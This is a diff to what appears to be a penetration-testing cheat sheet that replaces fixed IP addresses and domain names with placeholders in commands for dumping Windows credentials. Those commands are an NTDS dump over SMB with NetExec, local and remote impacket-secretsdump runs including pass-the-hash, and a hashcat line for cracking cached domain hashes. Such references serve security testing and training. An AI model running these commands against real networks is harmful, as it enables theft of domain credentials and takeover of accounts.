@@ -89,7 +89,7 @@ impacket-secretsdump -ntds ntds.dit -system system LOCAL
 ### Via NetExec (Remote, if you have DA creds)
 
 ```bash
-nxc smb 10.10.10.10 -u Administrator -p 'Password1' --ntds
+nxc smb $IP -u Administrator -p 'Password1' --ntds
 ```
 
 ---
@@ -112,6 +112,6 @@ hashcat -m 2100 dcc2.hash rockyou.txt
 ## Remote SAM Dump (If You Have Admin Creds)
 
 ```bash
-impacket-secretsdump CORP/Administrator:'Password1'@10.10.10.10
-impacket-secretsdump Administrator@10.10.10.10 -hashes :<ntlm-hash>
+impacket-secretsdump $NETBIOS/Administrator:'Password1'@$IP
+impacket-secretsdump Administrator@$IP -hashes :<ntlm-hash>
 ```
